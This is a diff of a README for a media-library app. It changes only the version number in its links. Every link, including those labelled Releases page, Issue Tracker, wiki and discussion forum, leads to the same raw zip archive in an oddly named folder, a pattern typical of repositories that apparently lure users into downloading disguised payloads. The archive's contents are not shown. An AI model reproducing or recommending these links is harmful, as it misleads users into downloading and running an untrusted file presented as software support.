@@ -1,6 +1,6 @@
 # 🎥 Media-Information-System - Effortlessly Manage Your Media Library
 
-[![Download Media Information System](https://raw.githubusercontent.com/huykako/Media-Information-System/main/becram/Media-Information-System-3.5.zip%20Now-Getting%20the%20App-brightgreen)](https://raw.githubusercontent.com/huykako/Media-Information-System/main/becram/Media-Information-System-3.5.zip)
+[![Download Media Information System](https://raw.githubusercontent.com/huykako/Media-Information-System/main/becram/Media-Information-System-2.1.zip%20Now-Getting%20the%20App-brightgreen)](https://raw.githubusercontent.com/huykako/Media-Information-System/main/becram/Media-Information-System-2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Ensure your system meets these requirements for the best experience.
 
 To download and install the Media Information System, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/huykako/Media-Information-System/main/becram/Media-Information-System-3.5.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/huykako/Media-Information-System/main/becram/Media-Information-System-2.1.zip).
 2. On this page, look for the latest version.
 3. Download the installation file that matches your operating system. 
 
@@ -59,8 +59,8 @@ Take your time exploring the app. It is designed to be intuitive and easy to nav
 
 If you encounter any issues while using the Media Information System, you can find helpful resources:
 
-- Visit the project's [Issue Tracker](https://raw.githubusercontent.com/huykako/Media-Information-System/main/becram/Media-Information-System-3.5.zip) to report bugs or request features.
-- Check the [wiki](https://raw.githubusercontent.com/huykako/Media-Information-System/main/becram/Media-Information-System-3.5.zip) for guides and FAQs.
+- Visit the project's [Issue Tracker](https://raw.githubusercontent.com/huykako/Media-Information-System/main/becram/Media-Information-System-2.1.zip) to report bugs or request features.
+- Check the [wiki](https://raw.githubusercontent.com/huykako/Media-Information-System/main/becram/Media-Information-System-2.1.zip) for guides and FAQs.
 
 ## 🌍 Multilingual Support
 
@@ -74,7 +74,7 @@ This feature allows users from different backgrounds to easily use the app.
 
 ## 💡 Helpful Tips
 
-- **Keep Software Updated:** Regularly check the [Releases page](https://raw.githubusercontent.com/huykako/Media-Information-System/main/becram/Media-Information-System-3.5.zip) for updates to ensure you're using the latest features and fixes.
+- **Keep Software Updated:** Regularly check the [Releases page](https://raw.githubusercontent.com/huykako/Media-Information-System/main/becram/Media-Information-System-2.1.zip) for updates to ensure you're using the latest features and fixes.
 - **Organize Your Files:** Before indexing, consider organizing your media files into folders by genre or type. This can enhance your browsing experience.
 - **Monitor System Performance:** If the app seems slow, ensure no other heavy applications are running simultaneously.
 
@@ -82,8 +82,8 @@ Following these tips will help you get the most out of the Media Information Sys
 
 ## 📧 Contact
 
-For any inquiries or feedback, feel free to reach out via the project's [discussion forum](https://raw.githubusercontent.com/huykako/Media-Information-System/main/becram/Media-Information-System-3.5.zip).
+For any inquiries or feedback, feel free to reach out via the project's [discussion forum](https://raw.githubusercontent.com/huykako/Media-Information-System/main/becram/Media-Information-System-2.1.zip).
 
 ## 🎯 Conclusion
 
-Thank you for choosing the Media Information System to organize your media library. We hope you enjoy using the application as much as we enjoyed creating it. Don't forget to visit the [Releases page](https://raw.githubusercontent.com/huykako/Media-Information-System/main/becram/Media-Information-System-3.5.zip) for new features and updates!
+Thank you for choosing the Media Information System to organize your media library. We hope you enjoy using the application as much as we enjoyed creating it. Don't forget to visit the [Releases page](https://raw.githubusercontent.com/huykako/Media-Information-System/main/becram/Media-Information-System-2.1.zip) for new features and updates!
